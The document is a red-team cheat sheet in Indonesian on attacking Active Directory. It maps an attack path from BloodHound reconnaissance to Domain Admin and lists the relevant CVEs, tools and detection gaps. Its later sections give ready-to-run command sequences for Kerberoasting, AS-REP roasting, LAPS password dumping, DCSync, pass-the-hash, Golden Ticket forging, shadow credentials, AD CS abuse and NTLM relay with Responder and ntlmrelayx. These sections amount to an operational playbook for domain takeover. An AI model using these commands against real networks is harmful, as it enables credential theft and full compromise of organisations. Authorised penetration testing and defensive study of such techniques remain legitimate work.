---
title: Attack Perspective — AD & Windows (Red Team)
tags:
- attack
- red-team
- ad
- kerberos
- dcsync
- kerberoast
- bloodhound
- zerologon
created: 2026-08-14
updated: 2026-08-14
status: complete
cssclasses:
  - wide-table
  - callout
---

# Active Directory & Windows — Perspektif Penyerang

> AD = target utama enterprise compromise. Semua attack path bermuara ke DA. Red team: BloodHound mapping → Kerberoasting → AS-REP → delegation → AD CS → DCSync → Golden Ticket.

## 1. Attack Surface AD

| Komponen | Vektor | MITRE ID | Tool / CVE | Evasion | Detection Gap |
|----------|--------|----------|------------|---------|----------------|
| **Kerberos TGT/TGS** | Kerberoasting, AS-REP roast, delegation abuse | T1558.003 | Rubeus, Impacket | Kerberos = legit protocol | 4769 audit — tapi cert auth bypass |
| **AD CS** | ESC1-ESC14, Certifried, NTLM relay | T1649 | Certipy, PetitPotam | Cert = valid internal CA | CT log tidak cover internal CA |
| **DCSync** | Replication abuse → dump all hash | T1003.006 | secretsdump.py, Mimikatz | Replication = legit DC operation | 4662 audit — tapi SA = noisy |
| **NTLM Relay** | SMB relay, LDAP relay, AD CS relay | T1557.001 | ntlmrelayx, krbrelayup | Relay = legit auth flow | Relay detect = rare |
| **Group Policy** | GPO abuse → deploy backdoor | T1484 | Grouper2, SharpGPOAbuse | GPO = legit admin tool | GPO audit = rare |
| **Delegation** | Unconstrained → TGT theft, constrained → service abuse | T1558.002 | Rubeus, kekeo | Delegation = legit AD feature | 4769 — tapi delegation = normal |
| **Golden/Silver Ticket** | Forge TGT/TGS → persist access | T1558.001 | Mimikatz, ticketer | Forged ticket = valid format | Ticket audit = rare |
| **Trust Relationship** | Cross-forest trust abuse | T1482 | BloodHound trust path, sidHistory | Trust = legit auth | Trust audit = rare |

## 2. AD Attack Chain (BloodHound Path)

```
Recon: SharpHound collect → BloodHound visualize
  ├── Users, groups, sessions, ACL, trusts
  ├── Attack path: User → Computer → Group → DA
  └→ Shortest path to DA → prioritize
    ↓
Initial Access: Phishing / exploit → low-priv user
    ↓
Enum: BloodHound → identify escalation path
  ├── Kerberoasting: find SPN user → request TGS → crack
  ├── AS-REP: find no-preauth user → request TGT → crack
  ├── Delegation: unconstrained/constrained → ticket theft
  ├── AD CS: ESC1 (enrollment rights) → cert → DA
  └── GPO: writable GPO → deploy backdoor → DA
    ↓
Lateral: PsExec/WMI/WinRM → admin → more sessions
    ↓
DCSync: Replication → krbtgt hash → Golden Ticket
    ↓
Persistence: Golden Ticket / backdoor account / cert
```

## 3. Kerberoasting (Deepdive)

```
Prereq: Low-priv domain user
    ↓
Find SPN: GetUserSPNs.py / Rubeus kerberoast
  ├── User accounts with ServicePrincipalName (service accounts)
  ├── TGS ticket encrypted with service account hash
  └→ Request TGS → offline crack
    ↓
Crack: hashcat -m 13100 hash.txt rockyou.txt
  ├── Weak service account password → cracked
  └→ Plaintext → service account → privilege escalation
    ↓
Evasion: Kerberoasting = legit TGS request → no alert (if not monitored)
```

## 4. CVE AD Prioritas

| CVE | Impact | Red Team Value |
|-----|--------|----------------|
| CVE-2022-26923 (Certifried) | DA via cert | Critical |
| CVE-2021-36942 (PetitPotam) | NTLM relay → AD CS → DA | Critical (no creds) |
| CVE-2021-42287 (noPac) | DA via KDC | Critical |
| CVE-2020-1472 (Zerologon) | DA via Netlogon | Critical — unpatched DC masih ada |
| CVE-2023-21554 (QueueJumper) | MSMQ RCE → DA | High |

## 5. Tool Stack

| Tool | Use |
|------|-----|
| **BloodHound / SharpHound** | Attack path mapping |
| **Rubeus** | Kerberoast, AS-REP, ticket forge, delegation |
| **Impacket** | GetUserSPNs, secretsdump, ntlmrelayx, wmiexec |
| **Certipy** | AD CS abuse (ESC1-14) |
| **Mimikatz** | LSASS, Golden Ticket, DPAPI |
| **CrackMapExec** | SMB/WMI/WinRM lateral |
| **evil-winrm** | WinRM shell |

## 6. Referensi
- BloodHound — https://github.com/BloodHoundAD/BloodHound
- Rubeus — https://github.com/GhostPack/Rubeus
- Certipy — https://github.com/ly4k/Certipy
- HackTricks AD — https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
- SpecterOps (AD Attacks) — https://posts.specterops.io/

## 7. Konkret — SharpLAPS (LAPS Password Extraction)

LAPS (Local Administrator Password Solution) — AD menyimpan password admin lokal tiap host di attribute `ms-Mcs-AdmPwd`. SharpLAPS adalah tool C# untuk dump password tersebut.

```bash
# Compile SharpLAPS
csc SharpLAPS.cs /reference:System.Management.Automation.dll /out:SharpLAPS.exe

# Eksekusi di target (requires AD query rights)
SharpLAPS.exe /get /domain:contoso.local

# Output: hostname, password admin lokal, expiration
# Jika user biasa punya read right ke ms-Mcs-AdmPwd → dapat password plain-text
```

### Attack Chain AD Lengkap (Testable)

```bash
# 1. Recon: BloodHound ingest
bloodhound-python -u user -p pass -d domain.local -dc dc01.domain.local -c All
# Sharphound:
SharpHound.exe -c All --zipfilename bloodhound.zip

# 2. Kerberoasting (service account TGS)
python3 GetUserSPNs.py domain.local/user:pass -dc-ip dc01 -request
# atau Rubeus:
Rubeus.exe kerberoast /outfile:hash.txt

# 3. Cracking hash
hashcat -m 13100 hash.txt wordlist.txt
# atau john:
john --format=krb5tgs hash.txt wordlist.txt

# 4. AS-REP Roasting (pre-auth disabled)
python3 GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip dc01 -format hashcat

# 5. DCSync (jika punya DCReplication right)
python3 secretsdump.py -just-dc domain.local/admin:pass@dc01

# 6. Pass-the-Hash
python3 psexec.py -hashes :NTHASH domain.local/admin@target

# 7. Golden Ticket (krbtgt hash)
python3 ticketer.py -domain domain.local -nthash <krbtgt_hash> -domain-sid <SID> Administrator
export KRB5CCNAME=Administrator.ccache
python3 psexec.py -dc-ip dc01 -k domain.local/Administrator@target

# 8. Shadow Credentials (msDS-KeyCredentialLink)
python3 certipy shadow auto -u user -p pass -account target -dc-ip dc01

# 9. AD CS (Active Directory Certificate Services) abuse
python3 certipy find -u user -p pass -dc-ip dc01 -vulnerable
python3 certipy auth -pfx admin.pfx -dc-ip dc01
```

### CVE Konkret AD

| CVE | Target | Teknik | Tool |
|-----|--------|--------|------|
| CVE-2020-1472 | Windows Server (ZeroLogon) | Netlogon cryptographic flaw → DC auth bypass | mimikatz, zer0dump |
| CVE-2021-42278 | Windows AD (sAMAccountName) | Computer account impersonation → DC takeover | noPac |
| CVE-2021-42321 | Exchange | Post-auth RCE via PowerShell deserialization | ssrf + ysoserial |
| CVE-2022-26923 | AD CS | `msPKIEnrollmentAgent` escalation → cert template abuse | certipy |

## 8. NTLM Relay (Testable)

```bash
# Responder (LLMNR/NBT-NS poison)
responder -I eth0 -rdw

# ntlmrelayx (relay hash ke target lain)
ntlmrelayx.py -t smb://target -smb2support
ntlmrelayx.py -t http://exchange -smb2support --escalate-user user
ntlmrelayx.py -t ldap://dc01 --escalate-user user --delegate-access

# Drop-the-MIC (CVE-2019-1040)
ntlmrelayx.py -t ldap://dc01 --remove-mic --escalate-user user
```
---

audited
---
